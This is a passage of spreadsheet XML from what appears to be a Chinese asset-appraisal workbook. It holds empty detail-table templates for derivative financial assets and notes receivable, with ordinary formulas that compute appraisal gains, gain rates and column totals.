      <c r="F20" s="581" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="580" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555">
        <f>J20-H20</f>
        <v/>
      </c>
      <c r="L20" s="555">
        <f>IF(H20=0,"",K20/H20*100)</f>
        <v/>
      </c>
      <c r="M20" s="383" t="n"/>
    </row>
    <row r="21" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="578" t="n"/>
      <c r="F21" s="581" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="580" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555">
        <f>J21-H21</f>
        <v/>
      </c>
      <c r="L21" s="555">
        <f>IF(H21=0,"",K21/H21*100)</f>
        <v/>
      </c>
      <c r="M21" s="383" t="n"/>
    </row>
    <row r="22" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="578" t="n"/>
      <c r="F22" s="581" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="580" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555">
        <f>J22-H22</f>
        <v/>
      </c>
      <c r="L22" s="555">
        <f>IF(H22=0,"",K22/H22*100)</f>
        <v/>
      </c>
      <c r="M22" s="383" t="n"/>
    </row>
    <row r="23" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="578" t="n"/>
      <c r="F23" s="581" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="580" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555">
        <f>J23-H23</f>
        <v/>
      </c>
      <c r="L23" s="555">
        <f>IF(H23=0,"",K23/H23*100)</f>
        <v/>
      </c>
      <c r="M23" s="383" t="n"/>
    </row>
    <row r="24" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="578" t="n"/>
      <c r="F24" s="581" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="580" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555">
        <f>J24-H24</f>
        <v/>
      </c>
      <c r="L24" s="555">
        <f>IF(H24=0,"",K24/H24*100)</f>
        <v/>
      </c>
      <c r="M24" s="383" t="n"/>
    </row>
    <row r="25" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="578" t="n"/>
      <c r="F25" s="581" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="580" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555">
        <f>J25-H25</f>
        <v/>
      </c>
      <c r="L25" s="555">
        <f>IF(H25=0,"",K25/H25*100)</f>
        <v/>
      </c>
      <c r="M25" s="383" t="n"/>
    </row>
    <row r="26" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="380" t="n"/>
      <c r="E26" s="578" t="n"/>
      <c r="F26" s="581" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="580" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555">
        <f>J26-H26</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>IF(H26=0,"",K26/H26*100)</f>
        <v/>
      </c>
      <c r="M26" s="383" t="n"/>
    </row>
    <row r="27" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="578" t="n"/>
      <c r="F27" s="581" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="580" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555">
        <f>J27-H27</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>IF(H27=0,"",K27/H27*100)</f>
        <v/>
      </c>
      <c r="M27" s="383" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="578" t="n"/>
      <c r="F28" s="581" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="580" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555">
        <f>J28-H28</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>IF(H28=0,"",K28/H28*100)</f>
        <v/>
      </c>
      <c r="M28" s="383" t="n"/>
    </row>
    <row r="29" s="415">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="381" t="n"/>
      <c r="D29" s="380" t="n"/>
      <c r="E29" s="578" t="n"/>
      <c r="F29" s="581" t="n"/>
      <c r="G29" s="555" t="n"/>
      <c r="H29" s="555" t="n"/>
      <c r="I29" s="580" t="n"/>
      <c r="J29" s="555" t="n"/>
      <c r="K29" s="555">
        <f>J29-H29</f>
        <v/>
      </c>
      <c r="L29" s="555">
        <f>IF(H29=0,"",K29/H29*100)</f>
        <v/>
      </c>
      <c r="M29" s="383" t="n"/>
    </row>
    <row r="30" s="415">
      <c r="A30" s="116" t="n"/>
      <c r="B30" s="380" t="n"/>
      <c r="C30" s="381" t="n"/>
      <c r="D30" s="380" t="n"/>
      <c r="E30" s="578" t="n"/>
      <c r="F30" s="581" t="n"/>
      <c r="G30" s="555" t="n"/>
      <c r="H30" s="555" t="n"/>
      <c r="I30" s="580" t="n"/>
      <c r="J30" s="555" t="n"/>
      <c r="K30" s="555">
        <f>J30-H30</f>
        <v/>
      </c>
      <c r="L30" s="555">
        <f>IF(H30=0,"",K30/H30*100)</f>
        <v/>
      </c>
      <c r="M30" s="383" t="n"/>
    </row>
    <row r="31" s="415">
      <c r="A31" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B31" s="380" t="inlineStr">
        <is>
          <t>合          计</t>
        </is>
      </c>
      <c r="C31" s="567" t="n"/>
      <c r="D31" s="383" t="n"/>
      <c r="E31" s="115" t="n"/>
      <c r="F31" s="383" t="n"/>
      <c r="G31" s="579" t="n"/>
      <c r="H31" s="555">
        <f>ROUND(SUM(H6:H30),2)</f>
        <v/>
      </c>
      <c r="I31" s="580" t="n"/>
      <c r="J31" s="555">
        <f>ROUND(SUM(J6:J30),2)</f>
        <v/>
      </c>
      <c r="K31" s="555">
        <f>J31-H31</f>
        <v/>
      </c>
      <c r="L31" s="555">
        <f>IF(H31=0,"",K31/H31*100)</f>
        <v/>
      </c>
      <c r="M31" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="L3:M3"/>
    <mergeCell ref="B2:M2"/>
    <mergeCell ref="B31:C31"/>
    <mergeCell ref="B1:M1"/>
  </mergeCells>
  <conditionalFormatting sqref="B6:H6">
    <cfRule type="expression" priority="3" dxfId="3">
      <formula>_xlfn.ISFORMULA(B6)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="I6:I12">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(I6)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="B5:M5 B7:M31 J6:M6">
    <cfRule type="expression" priority="4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1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codeName="Sheet18">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:J31"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="5.16666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="18.3333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="12.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="14.5" customWidth="1" style="410" min="5" max="5"/>
    <col width="15.1666666666667" customWidth="1" style="582" min="6" max="6"/>
    <col outlineLevel="1" width="14.6666666666667" customWidth="1" style="582" min="7" max="7"/>
    <col outlineLevel="1" width="11.3333333333333" customWidth="1" style="582" min="8" max="8"/>
    <col outlineLevel="1" width="11.6666666666667" customWidth="1" style="582" min="9" max="9"/>
    <col width="14.6666666666667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衍生金融资产评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="14" customHeight="1" s="415">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="14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373" t="n"/>
      <c r="H3" s="373" t="n"/>
      <c r="I3" s="373" t="n"/>
      <c r="J3" s="402" t="inlineStr">
        <is>
          <t>表3-3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583" t="n"/>
      <c r="G4" s="583" t="n"/>
      <c r="H4" s="583" t="n"/>
      <c r="I4" s="583" t="n"/>
      <c r="J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185" t="inlineStr">
        <is>
          <t>被投资项目名称</t>
        </is>
      </c>
      <c r="D5" s="185" t="inlineStr">
        <is>
          <t>投资日期</t>
        </is>
      </c>
      <c r="E5" s="185" t="inlineStr">
        <is>
          <t>成本</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="G5" s="584" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="H5" s="584" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="I5" s="584" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="578" t="n"/>
      <c r="E6" s="5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Height="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="580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Height="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="580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6.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="580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6.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="580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Height="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="580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Height="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="580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Height="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="580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Height="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="580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Height="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="580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Height="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="580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Height="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="580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Height="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="580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Height="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="580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Height="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="580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Height="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="580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Height="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="580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Height="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="580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Height="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="580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Height="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="580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Height="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="580" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>G26-F26</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>IF(F26=0,"",H26/F26*100)</f>
        <v/>
      </c>
      <c r="J26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>合           计</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="383" t="n"/>
      <c r="E27" s="580">
        <f>SUM(E6:E26)</f>
        <v/>
      </c>
      <c r="F27" s="555">
        <f>SUM(F6:F26)</f>
        <v/>
      </c>
      <c r="G27" s="555">
        <f>SUM(G6:G26)</f>
        <v/>
      </c>
      <c r="H27" s="555">
        <f>G27-F27</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>IF(F27=0,"",H27/F27*100)</f>
        <v/>
      </c>
      <c r="J27" s="383" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="n"/>
    </row>
    <row r="29" s="415">
      <c r="A29" s="116" t="n"/>
    </row>
    <row r="30" s="415">
      <c r="A30" s="116" t="n"/>
    </row>
    <row r="31" s="415">
      <c r="A31" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="B1:J1"/>
    <mergeCell ref="B2:J2"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:J27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codeName="Sheet19">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:K29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A26" sqref="A26:A29"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="9.5" customWidth="1" style="410" min="2" max="2"/>
    <col width="18.3333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="12.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="11.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="15.6666666666667" customWidth="1" style="582" min="7" max="7"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="582" min="8" max="8"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="582" min="9" max="10"/>
    <col width="14.6666666666667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应收票据评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="14" customHeight="1" s="415">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="14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402" t="inlineStr">
        <is>
          <t>表3-4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583" t="n"/>
      <c r="H4" s="583" t="n"/>
      <c r="I4" s="583" t="n"/>
      <c r="J4" s="583" t="n"/>
      <c r="K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出票日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>到期日期</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>票面利率%</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="H5" s="584" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="I5" s="584" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="J5" s="584" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="578" t="n"/>
      <c r="E6" s="578" t="n"/>
      <c r="F6" s="585" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555">
        <f>H6-G6</f>
        <v/>
      </c>
      <c r="J6" s="555">
        <f>IF(G6=0,"",I6/G6*100)</f>
        <v/>
      </c>
      <c r="K6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="578" t="n"/>
      <c r="F7" s="585" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555">
        <f>H7-G7</f>
        <v/>
      </c>
      <c r="J7" s="555">
        <f>IF(G7=0,"",I7/G7*100)</f>
        <v/>
      </c>
      <c r="K7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="578" t="n"/>
      <c r="F8" s="585" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555">
        <f>H8-G8</f>
        <v/>
      </c>
      <c r="J8" s="555">
        <f>IF(G8=0,"",I8/G8*100)</f>
        <v/>
      </c>
      <c r="K8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="578" t="n"/>
      <c r="F9" s="585" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555">
        <f>H9-G9</f>
        <v/>
      </c>
      <c r="J9" s="555">
        <f>IF(G9=0,"",I9/G9*100)</f>
        <v/>
      </c>
      <c r="K9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="578" t="n"/>
      <c r="F10" s="585" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555">
        <f>H10-G10</f>
        <v/>
      </c>
      <c r="J10" s="555">
        <f>IF(G10=0,"",I10/G10*100)</f>
        <v/>
      </c>
      <c r="K10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="578" t="n"/>
      <c r="F11" s="585" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555">
        <f>H11-G11</f>
        <v/>
      </c>
      <c r="J11" s="555">
        <f>IF(G11=0,"",I11/G11*100)</f>
        <v/>
      </c>
      <c r="K11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="578" t="n"/>
      <c r="F12" s="585" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555">
        <f>H12-G12</f>
        <v/>
      </c>
      <c r="J12" s="555">
        <f>IF(G12=0,"",I12/G12*100)</f>
        <v/>
      </c>
      <c r="K12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="578" t="n"/>
      <c r="F13" s="585" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555">
        <f>H13-G13</f>
        <v/>
      </c>
      <c r="J13" s="555">
        <f>IF(G13=0,"",I13/G13*100)</f>
        <v/>
      </c>
      <c r="K13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="578" t="n"/>
      <c r="F14" s="585" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555">
        <f>H14-G14</f>
        <v/>
      </c>
      <c r="J14" s="555">
        <f>IF(G14=0,"",I14/G14*100)</f>
        <v/>
      </c>
      <c r="K14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="578" t="n"/>
      <c r="F15" s="585" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555">
        <f>H15-G15</f>
        <v/>
      </c>
      <c r="J15" s="555">
        <f>IF(G15=0,"",I15/G15*100)</f>
        <v/>
      </c>
      <c r="K15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="578" t="n"/>
      <c r="F16" s="585" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555">
        <f>H16-G16</f>
        <v/>
      </c>
      <c r="J16" s="555">
        <f>IF(G16=0,"",I16/G16*100)</f>
        <v/>
      </c>
      <c r="K16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="578" t="n"/>
      <c r="F17" s="585" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555">
        <f>H17-G17</f>
        <v/>
      </c>
      <c r="J17" s="555">
        <f>IF(G17=0,"",I17/G17*100)</f>
        <v/>
      </c>
      <c r="K17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="578" t="n"/>
      <c r="F18" s="585" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555">
        <f>H18-G18</f>
        <v/>
      </c>
      <c r="J18" s="555">
        <f>IF(G18=0,"",I18/G18*100)</f>
        <v/>
      </c>
      <c r="K18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="578" t="n"/>
      <c r="F19" s="585" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555">
        <f>H19-G19</f>
        <v/>
      </c>
      <c r="J19" s="555">
        <f>IF(G19=0,"",I19/G19*100)</f>
        <v/>
      </c>
      <c r="K19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="578" t="n"/>
      <c r="F20" s="585" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555">
        <f>H20-G20</f>
        <v/>
      </c>
      <c r="J20" s="555">
        <f>IF(G20=0,"",I20/G20*100)</f>
        <v/>
      </c>
      <c r="K20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="578" t="n"/>
      <c r="F21" s="585" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555">
        <f>H21-G21</f>
        <v/>
      </c>
      <c r="J21" s="555">
        <f>IF(G21=0,"",I21/G21*100)</f>
        <v/>
      </c>
      <c r="K21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="578" t="n"/>
      <c r="F22" s="585" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555">
        <f>H22-G22</f>
        <v/>
      </c>
      <c r="J22" s="555">
        <f>IF(G22=0,"",I22/G22*100)</f>
        <v/>
      </c>
      <c r="K22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="578" t="n"/>
      <c r="F23" s="585" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555">
        <f>H23-G23</f>
        <v/>
      </c>
      <c r="J23" s="555">
        <f>IF(G23=0,"",I23/G23*100)</f>
        <v/>
      </c>
      <c r="K23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="578" t="n"/>
      <c r="F24" s="585" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555">
        <f>H24-G24</f>
        <v/>
      </c>
      <c r="J24" s="555">
        <f>IF(G24=0,"",I24/G24*100)</f>
        <v/>
      </c>
      <c r="K24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
